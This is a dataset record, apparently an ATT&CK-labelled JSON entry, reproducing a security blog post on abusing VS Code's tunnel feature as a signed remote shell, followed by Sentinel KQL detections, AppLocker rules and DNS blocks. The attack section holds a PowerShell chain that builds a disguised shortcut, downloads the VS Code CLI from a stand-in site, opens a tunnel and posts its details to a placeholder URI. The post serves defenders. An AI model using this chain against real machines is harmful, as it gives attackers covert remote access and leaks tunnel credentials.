@@ -1,0 +1,117 @@
+{
+  "original_txt": "Visual Studio Code: embedded reverse shell and how to block, create Sentinel Detection, and add Environment Prevention — well more like ideas and concepts to prevent abuse and exploit\nUPDATE: Looks like MS released GPO controls finally: https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/policies\nPS: I’ve also seen this attack being used by Red Teams and can confirm that it is possible to deploy 100% High Fidelity detection for this type of attack regardless of SIEM. If you have not already, be sure to build this out and make your team standout :) — If you dig deep enough, you can develop a blanket rule to catch any activity that's similar to this regardless of filename and application.\nOne of the worst fears as a cybersecurity expert is detecting and preventing a signed reverse shell binary. Guess what? Microsoft gladly gave us one. We can relate this back to when nmap had something like this before they removed the feature. You could running CLI and execute commands from the binary. Fast forward, we still see applications providing this type of feature. This will not be the last time we see this.\nArticles of interest:\nhttps://code.visualstudio.com/docs/remote/tunnels\nhttps://code.visualstudio.com/blogs/2022/12/07/remote-even-better\nWhat makes this bad is the fact that this tunnel can be triggered from the command line with the portable version of code.exe. An attacker just has to upload the binary, which won’t be detected by any anti-virus since it is legitimate and singed windows binary. If a VSCode is already installed, we can just stick to the installed version, doesn’t matter.\nAttack\nIf we get code execution on the client we can always drop the portable version of VSCode, the code CLI. If a VSCode is already installed, we can just stick to the installed version, doesn’t matter. Just know that both options exist and it's normally installed by default these days.\nAs the binary is signed from Microsoft it will also bypass most restrictions and not set off any alarms.\nC:\\Users\\kitten\\Downloads\\vscode_cli_win32_x64_cli (1)>.\\code.exe tunnel\n*\n* Visual Studio Code Server\n*\n* By using the software, you agree to\n* the Visual Studio Code Server License Terms (https://aka.ms/vscode-server-license) and\n* the Microsoft Privacy Statement (https://privacy.microsoft.com/en-US/privacystatement).\n*\nTo grant access to the server, please log into https://github.com/login/device and use code BD3D-134C\n✔ What would you like to call this machine? · desktop-kafcprf\n[2023-09-25 03:45:34] info Creating tunnel with the name: desktop-kafcprf\nOpen this link in your browser https://vscode.dev/tunnel/desktop-kafcprf/C:/Users/kitten/Downloads/vscode_cli_win32_x64_cli%20(1)\nNot one alert went off. Very sneaky and this is a very nice and clean remote shell.\nIf you wanted, you could build out an attack chain: (AI generated)\n$EXEPath = \"$env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n$pay = 'cd C:\\tmp; iwr -uri https://somecleanhostedsite/vscode_cli_win32_x64_cli.zip -OutFile vscode.zip; Expand-Archive vscode.zip; cd vscode; .\\code.exe tunnel user logout; Start-Sleep 3; Start-Process -FilePath .\\code.exe -ArgumentList \"tunnel\",\"--name\",\"TNAME\" -RedirectStandardOutput .\\output.txt; Start-Sleep 3; iwr -uri URICONTENT -Method Post -Body (Get-Content .\\output.txt)'\n$arguments = \" -nop -c $pay\"\n$LNKName = 123\n$obj = New-Object -ComObject WScript.Shell\n$link = $obj.CreateShortcut((Get-Location).Path + \"\\\" + $LNKName + \".lnk\")\n$link.WindowStyle = '7'\n$link.TargetPath = $EXEPath\n$link.IconLocation = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,13\"\n$link.Arguments = $arguments\n$link.Save()\nDetection\nBecause every environment and machine is different, your mileage may vary, especially as updates or changes happen, so take these ideas and expand and use them as you see fit.\nRemember, logging also depends on auditing setting in your environment. Endpoint log sources offer the most visibility.\nFile Creation\nFile write of code_tunnel.json which is param based but defaults to: %UserProfile%\\.vscode-cli\\code_tunnel.json\nlicense_consent.json file could also be watched when testing and playing in a vanilla instance.\nNot the most ideal solution as this requires endpoint logs which can be costly, especially file based ones.\nCommand Line\nYou could use a KQL query like the following as a quick and dirty way to get started.\nSecurityEvent\n| where EventID == \"4688\"\n| where CommandLine contains \"code.exe\" and CommandLine contains \"tunnel\"\nDownside, is that code could be renamed and not actually be used. One option is to just look for the tunnel in the CLI. This could be the ideal way and then filter out FPs and not lose visibility.\nSecurityEvent\n| where EventID == \"4688\"\n| where CommandLine contains \"tunnel\"\nProcess Tree\nWe could look for process spawning from the original file or the file being dropped and then ran.\nProcess tree: code.exe -> cmd.exe -> .exe\nSecurityEvent\n| where EventID == \"4688\"\n| where ParentProcessName == \"code.exe\"\n| where NewProcessName contains \"cmd\" or NewProcessName contains \"powershell\"\nAnother option is you could also mix in looking for the file making or network connections with firewall or other end point based logs stemming from the file.\nPrevention\nAppLocker\nThis is a great application, but requires effort and work to maintain for many reasons.\nOne example may be to build a template to block by hash.\n<AppLockerPolicy Version=\"1\">\n<RuleCollection Type=\"Exe\" EnforcementMode=\"NotConfigured\">\n<FileHashRule Id=\"GUID\" Name=\"code.exe\" Description=\"\" UserOrGroupSid=\"S-1-1-0\" Action=\"Deny\">\n<Conditions>\n<FileHashCondition>\n<FileHash Type=\"SHA256\" Data=\"hashid\" SourceFileName=\"code.exe\" SourceFileLength=\"\" />\n</FileHashCondition>\n</Conditions>\n</FileHashRule>\n</RuleCollection>\n</AppLockerPolicy>\nDNS Blocking\nThis is probably the easiest to maintain and manage as it’s a central location and doesn’t require much reconfiguration especially if you have full control over DNS in your environment.\n*.tunnels.api.visualstudio.com\n*.devtunnels.ms\nGPO\nWhile this looks possible for visual studio there does not look to be a way to do this for vscode at this time\nConclusion\nHopefully this gives you some ideas on how to better protect and defend against this type of attack.\n—\n☕ Like what you read? Did it help you?\nSend some coffee and love https://buymeacoffee.com/truvis :)\nYour support helps pay for licenses, research & development, and other costs that allow me to bring you new guides and content!\n❗If you are new to my content, be sure to follow/connect with me on all my other socials for new ideas and solutions to complicated real world problems and jump start your career! New content drops daily/weekly along with tips and tricks :)\n👉 W: https://truv.is\n👉 T: https://twitter.com/thattechkitten\n👉 Y: https://www.youtube.com/@TRUValueInformationSecurity\n👉 G: https://github.com/truvis\n👉 L: https://www.linkedin.com/in/truvisthornton\n👉 M: https://medium.com/@truvis.thornton",
+  "sanitized_txt": "Visual Studio Code: embedded reverse shell and how to block, create Sentinel Detection, and add Environment Prevention — well more like ideas and concepts to prevent abuse and exploit UPDATE: Looks like MS released GPO controls finally: https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/policies PS: I’ve also seen this attack being used by Red Teams and can confirm that it is possible to deploy 100% High Fidelity detection for this type of attack regardless of SIEM. If you have not already, be sure to build this out and make your team standout :) — If you dig deep enough, you can develop a blanket rule to catch any activity that's similar to this regardless of filename and application.\nOne of the worst fears as a cybersecurity expert is detecting and preventing a signed reverse shell binary. Guess what? Microsoft gladly gave us one. We can relate this back to when nmap had something like this before they removed the feature. You could running CLI and execute commands from the binary. Fast forward, we still see applications providing this type of feature. This will not be the last time we see this.\nArticles of interest:\nhttps://code.visualstudio.com/docs/remote/tunnels https://code.visualstudio.com/blogs/2022/12/07/remote-even-better What makes this bad is the fact that this tunnel can be triggered from the command line with the portable version of code.exe. An attacker just has to upload the binary, which won’t be detected by any anti-virus since it is legitimate and singed windows binary. If a VSCode is already installed, we can just stick to the installed version, doesn’t matter.\nAttack If we get code execution on the client we can always drop the portable version of VSCode, the code CLI. If a VSCode is already installed, we can just stick to the installed version, doesn’t matter. Just know that both options exist and it's normally installed by default these days.\nAs the binary is signed from Microsoft it will also bypass most restrictions and not set off any alarms.\nC:\\Users\\kitten\\Downloads\\vscode_cli_win32_x64_cli (1)>.\\code.exe tunnel * * Visual Studio Code Server * * By using the software, you agree to * the Visual Studio Code Server License Terms (https://aka.ms/vscode-server-license) and * the Microsoft Privacy Statement (https://privacy.microsoft.com/en-US/privacystatement).\n* To grant access to the server, please log into https://github.com/login/device and use code BD3D-134C ✔ What would you like to call this machine? · desktop-kafcprf [2023-09-25 03:45:34] info Creating tunnel with the name: desktop-kafcprf Open this link in your browser https://vscode.dev/tunnel/desktop-kafcprf/C:/Users/kitten/Downloads/vscode_cli_win32_x64_cli%20(1) Not one alert went off. Very sneaky and this is a very nice and clean remote shell.\nIf you wanted, you could build out an attack chain: (AI generated) $EXEPath = \"$env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" $pay = 'cd C:\\tmp; iwr -uri https://somecleanhostedsite/vscode_cli_win32_x64_cli.zip -OutFile vscode.zip; Expand-Archive vscode.zip; cd vscode; .\\code.exe tunnel user logout; Start-Sleep 3; Start-Process -FilePath .\\code.exe -ArgumentList \"tunnel\",\"--name\",\"TNAME\" -RedirectStandardOutput .\\output.txt; Start-Sleep 3; iwr -uri URICONTENT -Method Post -Body (Get-Content .\\output.txt)' $arguments = \" -nop -c $pay\" $LNKName = 123 $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut((Get-Location).Path + \"\\\" + $LNKName + \".lnk\") $link.WindowStyle = '7' $link.TargetPath = $EXEPath $link.IconLocation = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,13\" $link.Arguments = $arguments $link.Save() Detection Because every environment and machine is different, your mileage may vary, especially as updates or changes happen, so take these ideas and expand and use them as you see fit.\nRemember, logging also depends on auditing setting in your environment. Endpoint log sources offer the most visibility.\nFile Creation File write of code_tunnel.json which is param based but defaults to: %UserProfile%\\.vscode-cli\\code_tunnel.json license_consent.json file could also be watched when testing and playing in a vanilla instance.\nNot the most ideal solution as this requires endpoint logs which can be costly, especially file based ones.\nCommand Line You could use a KQL query like the following as a quick and dirty way to get started.\nSecurityEvent | where EventID == \"4688\" | where CommandLine contains \"code.exe\" and CommandLine contains \"tunnel\" Downside, is that code could be renamed and not actually be used. One option is to just look for the tunnel in the CLI. This could be the ideal way and then filter out FPs and not lose visibility.\nSecurityEvent | where EventID == \"4688\" | where CommandLine contains \"tunnel\" Process Tree We could look for process spawning from the original file or the file being dropped and then ran.\nProcess tree: code.exe -> cmd.exe -> .exe SecurityEvent | where EventID == \"4688\" | where ParentProcessName == \"code.exe\" | where NewProcessName contains \"cmd\" or NewProcessName contains \"powershell\" Another option is you could also mix in looking for the file making or network connections with firewall or other end point based logs stemming from the file.\nPrevention AppLocker This is a great application, but requires effort and work to maintain for many reasons.\nOne example may be to build a template to block by hash.\n<AppLockerPolicy Version=\"1\"> <RuleCollection Type=\"Exe\" EnforcementMode=\"NotConfigured\"> <FileHashRule Id=\"GUID\" Name=\"code.exe\" Description=\"\" UserOrGroupSid=\"S-1-1-0\" Action=\"Deny\"> <Conditions> <FileHashCondition> <FileHash Type=\"SHA256\" Data=\"hashid\" SourceFileName=\"code.exe\" SourceFileLength=\"\" /> </FileHashCondition> </Conditions> </FileHashRule> </RuleCollection> </AppLockerPolicy> DNS Blocking This is probably the easiest to maintain and manage as it’s a central location and doesn’t require much reconfiguration especially if you have full control over DNS in your environment.\n*.tunnels.api.visualstudio.com *.devtunnels.ms GPO While this looks possible for visual studio there does not look to be a way to do this for vscode at this time Conclusion Hopefully this gives you some ideas on how to better protect and defend against this type of attack.\n— ☕ Like what you read? Did it help you?\nSend some coffee and love https://buymeacoffee.com/truvis :) Your support helps pay for licenses, research & development, and other costs that allow me to bring you new guides and content!\n❗If you are new to my content, be sure to follow/connect with me on all my other socials for new ideas and solutions to complicated real world problems and jump start your career! New content drops daily/weekly along with tips and tricks :) 👉 W: https://truv.is 👉 T: https://twitter.com/thattechkitten 👉 Y: https://www.youtube.com/@TRUValueInformationSecurity 👉 G: https://github.com/truvis 👉 L: https://www.linkedin.com/in/truvisthornton 👉 M: https://medium.com/@truvis.thornton",
+  "ID_list": [
+    "T1219.001"
+  ],
+  "Name_list": [
+    "Collection",
+    "Execution",
+    "PowerShell",
+    "Source"
+  ],
+  "TTP_sentences": {
+    "T1219.001": [
+      {
+        "sentence": "Visual Studio Code: embedded reverse shell and how to block, create Sentinel Detection, and add Environment Prevention — well more like ideas and concepts to prevent abuse and exploit UPDATE: Looks like MS released GPO controls finally: https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/policies PS: I’ve also seen this attack being used by Red Teams and can confirm that it is possible to deploy 100% High Fidelity detection for this type of attack regardless of SIEM.",
+        "score": 0.4924
+      },
+      {
+        "sentence": "If you have not already, be sure to build this out and make your team standout :) — If you dig deep enough, you can develop a blanket rule to catch any activity that's similar to this regardless of filename and application.",
+        "score": 0.3537
+      },
+      {
+        "sentence": "One of the worst fears as a cybersecurity expert is detecting and preventing a signed reverse shell binary.",
+        "score": 0.408
+      },
+      {
+        "sentence": "We can relate this back to when nmap had something like this before they removed the feature.",
+        "score": 0.321
+      },
+      {
+        "sentence": "You could running CLI and execute commands from the binary.",
+        "score": 0.3725
+      },
+      {
+        "sentence": "Fast forward, we still see applications providing this type of feature.",
+        "score": 0.3924
+      },
+      {
+        "sentence": "This will not be the last time we see this.",
+        "score": 0.3655
+      },
+      {
+        "sentence": "Articles of interest: https://code.visualstudio.com/docs/remote/tunnels https://code.visualstudio.com/blogs/2022/12/07/remote-even-better What makes this bad is the fact that this tunnel can be triggered from the command line with the portable version of code.exe.",
+        "score": 0.6455
+      },
+      {
+        "sentence": "An attacker just has to upload the binary, which won’t be detected by any anti-virus since it is legitimate and singed windows binary.",
+        "score": 0.43
+      },
+      {
+        "sentence": "If a VSCode is already installed, we can just stick to the installed version, doesn’t matter.",
+        "score": 0.4552
+      },
+      {
+        "sentence": "Attack If we get code execution on the client we can always drop the portable version of VSCode, the code CLI.",
+        "score": 0.3693
+      },
+      {
+        "sentence": "If a VSCode is already installed, we can just stick to the installed version, doesn’t matter.",
+        "score": 0.4552
+      },
+      {
+        "sentence": "Just know that both options exist and it's normally installed by default these days.",
+        "score": 0.4165
+      },
+      {
+        "sentence": "Very sneaky and this is a very nice and clean remote shell.",
+        "score": 0.567
+      },
+      {
+        "sentence": "Endpoint log sources offer the most visibility.",
+        "score": 0.3804
+      },
+      {
+        "sentence": "File Creation File write of code_tunnel.json which is param based but defaults to: %UserProfile%\\.vscode-cli\\code_tunnel.json license_consent.json file could also be watched when testing and playing in a vanilla instance.",
+        "score": 0.5365
+      },
+      {
+        "sentence": "Not the most ideal solution as this requires endpoint logs which can be costly, especially file based ones.",
+        "score": 0.366
+      },
+      {
+        "sentence": "SecurityEvent | where EventID == \"4688\" | where CommandLine contains \"code.exe\" and CommandLine contains \"tunnel\" Downside, is that code could be renamed and not actually be used.",
+        "score": 0.3838
+      },
+      {
+        "sentence": "One option is to just look for the tunnel in the CLI.",
+        "score": 0.518
+      },
+      {
+        "sentence": "This could be the ideal way and then filter out FPs and not lose visibility.",
+        "score": 0.3394
+      },
+      {
+        "sentence": "SecurityEvent | where EventID == \"4688\" | where CommandLine contains \"tunnel\" Process Tree We could look for process spawning from the original file or the file being dropped and then ran.",
+        "score": 0.4677
+      },
+      {
+        "sentence": "Process tree: code.exe -> cmd.exe -> .exe SecurityEvent | where EventID == \"4688\" | where ParentProcessName == \"code.exe\" | where NewProcessName contains \"cmd\" or NewProcessName contains \"powershell\" Another option is you could also mix in looking for the file making or network connections with firewall or other end point based logs stemming from the file.",
+        "score": 0.4423
+      },
+      {
+        "sentence": "Prevention AppLocker This is a great application, but requires effort and work to maintain for many reasons.",
+        "score": 0.3753
+      },
+      {
+        "sentence": "Send some coffee and love https://buymeacoffee.com/truvis :) Your support helps pay for licenses, research & development, and other costs that allow me to bring you new guides and content! ❗If you are new to my content, be sure to follow/connect with me on all my other socials for new ideas and solutions to complicated real world problems and jump start your career!",
+        "score": 0.4718
+      },
+      {
+        "sentence": "New content drops daily/weekly along with tips and tricks :) 👉 W: https://truv.is 👉 T: https://twitter.com/thattechkitten 👉 Y: https://www.youtube.com/@TRUValueInformationSecurity 👉 G: https://github.com/truvis 👉 L: https://www.linkedin.com/in/truvisthornton 👉 M: https://medium.com/@truvis.thornton",
+        "score": 0.3842
+      }
+    ]
+  }
+}
